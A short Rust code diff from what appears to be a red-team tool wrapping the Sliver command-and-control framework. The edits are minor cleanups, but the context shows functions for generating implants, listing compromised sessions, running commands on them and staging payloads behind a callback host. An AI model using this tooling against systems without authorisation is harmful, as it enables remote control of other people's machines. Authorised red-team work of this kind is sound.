@@ -47,7 +47,7 @@ impl SliverGrpcClient {
             }
         });
 
-        let mut req = self.client.post(&format!("{}/generate", self.base_url))
+        let mut req = self.client.post(format!("{}/generate", self.base_url))
             .json(&payload);
         
         if let Some(ref token) = self.auth_token {
@@ -64,7 +64,7 @@ impl SliverGrpcClient {
     }
 
     async fn list_sessions(&self) -> Result<Vec<Value>> {
-        let mut req = self.client.get(&format!("{}/sessions", self.base_url));
+        let mut req = self.client.get(format!("{}/sessions", self.base_url));
         
         if let Some(ref token) = self.auth_token {
             req = req.bearer_auth(token);
@@ -86,7 +86,7 @@ impl SliverGrpcClient {
             "Timeout": 30
         });
 
-        let mut req = self.client.post(&format!("{}/sessions/{}/execute", self.base_url, session_id))
+        let mut req = self.client.post(format!("{}/sessions/{}/execute", self.base_url, session_id))
             .json(&payload);
         
         if let Some(ref token) = self.auth_token {
@@ -156,7 +156,7 @@ impl<M: ExecutorMode> C2Operator for SovereignSliverOperator<M> {
         // Stage payload on managed infrastructure
         let callback_host = self.get_callback_host().await?;
         let staging_server = crate::utils::payload_server::PayloadServer::new();
-        let token = staging_server.stage_payload(std::path::PathBuf::from(payload_path));
+        let token = staging_server.stage_payload(std::path::PathBuf::from(payload_path)).await;
         let port = staging_server.start().await?;
         
         // Construct deployment vector
